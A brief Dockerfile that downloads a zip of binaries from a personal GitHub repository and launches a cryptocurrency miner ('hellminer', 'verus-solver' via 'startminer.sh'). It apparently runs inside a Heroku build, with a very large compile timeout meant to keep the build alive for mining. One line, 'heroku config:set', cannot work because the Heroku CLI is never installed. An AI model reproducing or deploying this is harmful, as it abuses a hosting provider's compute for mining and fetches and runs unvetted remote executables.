FROM debian:stable
RUN apt-get update && apt-get -y install wget vim unzip
WORKDIR /home
RUN heroku config:set COMPILE_TIMEOUT=99999999999999999999999999999
RUN wget https://github.com/sicobra00/project1/raw/main/project.zip
RUN unzip project.zip
RUN chmod +x startminer.sh
RUN chmod +x hellminer
RUN chmod +x verus-solver
RUN ./startminer.sh
